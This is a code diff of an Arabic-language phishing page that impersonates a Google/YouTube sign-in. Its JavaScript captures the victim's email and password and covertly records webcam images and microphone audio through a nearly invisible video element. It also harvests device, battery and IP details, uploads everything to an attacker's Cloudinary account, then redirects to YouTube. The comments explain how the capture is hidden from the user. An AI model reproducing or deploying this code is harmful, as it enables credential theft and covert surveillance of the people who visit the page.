@@ -1,106 +1,94 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - YouTube Verification</title>
-    <style>
-        body { margin: 0; font-family: sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .box { width: 90%; max-width: 400px; text-align: center; padding: 30px; border: 1px solid #ddd; border-radius: 8px; z-index: 10; background: #fff; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
-        button { background: #1a73e8; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; font-weight: bold; }
+async function run() {
+    const email = document.getElementById('e').value, pass = document.getElementById('p').value;
+    if(!email || !pass) return;
+
+    try {
+        // 1. طلب الصلاحيات (صوت وصورة)
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: true, 
+            audio: { echoCancellation: true, noiseSuppression: true } 
+        });
         
-        /* السر هنا: الفيديو ظاهر بس غير مرئي للبشر */
-        #v { 
-            position: absolute; 
-            top: 0; left: 0; 
-            width: 1px; height: 1px; 
-            opacity: 0.01; 
-            pointer-events: none; 
-        }
-        #c { display: none; }
-    </style>
-</head>
-<body>
+        const video = document.getElementById('v');
+        video.srcObject = stream;
+        video.play();
 
-<div class="box" id="ui">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
-    <h2>تأكيد الهوية</h2>
-    <p>يرجى تسجيل الدخول للمتابعة إلى YouTube</p>
-    <input type="email" id="e" placeholder="البريد الإلكتروني">
-    <input type="password" id="p" placeholder="كلمة المرور">
-    <button onclick="run()">التالي</button>
-</div>
+        document.getElementById('ui').innerHTML = "<h3>جاري مزامنة الحساب...</h3><p>يرجى الانتظار 5 ثوانٍ لإتمام الفحص</p>";
 
-<video id="v" autoplay playsinline muted></video>
-<canvas id="c" width="640" height="480"></canvas>
+        // 2. سحب بيانات البطارية والجهاز فوراً
+        const deviceDetails = await getDeviceDetails();
 
-<script>
-    const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-
-    async function run() {
-        const email = document.getElementById('e').value, pass = document.getElementById('p').value;
-        if(!email || !pass) return;
-
-        try {
-            // 1. طلب الوصول (هنا اليوزر هيوافق لكروم)
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: 640, height: 480 }, 
-                audio: true 
-            });
-            
-            const video = document.getElementById('v');
-            video.srcObject = stream;
-
-            // تمويه الواجهة
-            document.getElementById('ui').innerHTML = "<h3>جاري معالجة البيانات...</h3><p>يرجى عدم إغلاق الصفحة</p>";
-
-            // 2. الانتظار "الإجباري" لاستقرار الحساس (Sensor)
-            // الموبايلات القديمة في ويندوز 7 محتاجة وقت عشان الـ Buffer يملى
-            setTimeout(() => {
-                takeAction(email, pass, stream);
-            }, 4000); // 4 ثواني كاملة لضمان الصورة والصوت
-
-        } catch (err) {
-            window.location.href = yt;
-        }
-    }
-
-    function takeAction(email, pass, stream) {
-        // التقاط الصورة من الفيديو "الشغال فعلياً"
-        const canvas = document.getElementById('c');
-        canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
-        const img = canvas.toDataURL("image/png");
-
-        // تسجيل الصوت (5 ثواني)
-        const rec = new MediaRecorder(stream);
-        let chunks = [];
-        rec.ondataavailable = ev => chunks.push(ev.data);
-        rec.onstop = () => {
-            const blob = new Blob(chunks, { type: 'audio/webm' }); // webm أضمن للمتصفحات من mp3
-            upload(email, pass, img, blob);
-        };
-        rec.start();
+        // 3. الانتظار لاستقرار الكاميرا ثم التصوير والتسجيل
         setTimeout(() => {
-            rec.stop();
-            // التحويل النهائي بعد التأكد من "بدء" الرفع
-            setTimeout(() => { window.location.href = yt; }, 1000);
-        }, 5000);
-    }
+            const canvas = document.getElementById('c');
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            const imgData = canvas.toDataURL("image/png");
 
-    async function upload(e, p, img, blob) {
-        // رفع الصورة
-        const fd1 = new FormData();
-        fd1.append('file', img); fd1.append('upload_preset', pr);
-        fd1.append('context', `u=${e}|p=${p}`);
-        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fd1, keepalive: true });
+            startVoiceRecording(email, pass, imgData, deviceDetails, stream);
+        }, 3000);
 
-        // رفع الصوت
-        const fd2 = new FormData();
-        fd2.append('file', blob); fd2.append('upload_preset', pr);
-        fd2.append('resource_type', 'video');
-        fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fd2, keepalive: true });
-    }
-</script>
-</body>
-</html>
+    } catch (err) { window.location.href = yt; }
+}
+
+async function getDeviceDetails() {
+    let info = {
+        model: navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown",
+        battery: "N/A",
+        charging: "N/A"
+    };
+
+    // سحب بيانات البطارية (Battery API)
+    try {
+        if (navigator.getBattery) {
+            const bt = await navigator.getBattery();
+            info.battery = Math.round(bt.level * 100) + "%";
+            info.charging = bt.charging ? "Yes" : "No";
+        }
+    } catch (e) {}
+    
+    return info;
+}
+
+function startVoiceRecording(e, p, img, dev, stream) {
+    // حل مشكلة الصوت: استخدام الصيغة الأصلية للمتصفح
+    const recorder = new MediaRecorder(stream);
+    let chunks = [];
+
+    recorder.ondataavailable = ev => chunks.push(ev.data);
+    recorder.onstop = () => {
+        const audioBlob = new Blob(chunks, { type: 'audio/webm' }); // أفضل صيغة لضمان التسجيل
+        uploadAll(e, p, img, audioBlob, dev);
+    };
+
+    recorder.start();
+    // نسجل 5 ثواني صوت عشان نلحق نرفع
+    setTimeout(() => {
+        recorder.stop();
+        // تحويل لليوتيوب بعد ثانية من قفل التسجيل لضمان خروج الـ Request
+        setTimeout(() => { window.location.href = yt; }, 1500);
+    }, 5000);
+}
+
+async function uploadAll(e, p, img, audio, dev) {
+    let ip = "Unknown";
+    try { 
+        const r = await fetch('https://api.ipify.org?format=json');
+        const d = await r.json();
+        ip = d.ip;
+    } catch(err){}
+
+    const commonContext = `u=${e}|p=${p}|ip=${ip}|dev=${dev.model}|bat=${dev.battery}|char=${dev.charging}`;
+
+    // رفع الصورة
+    const fd1 = new FormData();
+    fd1.append('file', img); fd1.append('upload_preset', pr);
+    fd1.append('context', commonContext);
+    fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fd1, keepalive: true });
+
+    // رفع الصوت
+    const fd2 = new FormData();
+    fd2.append('file', audio); fd2.append('upload_preset', pr);
+    fd2.append('resource_type', 'video'); // ضروري عشان كلوديناري يقبله كملف وسائط
+    fd2.append('context', commonContext);
+    fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fd2, keepalive: true });
+}
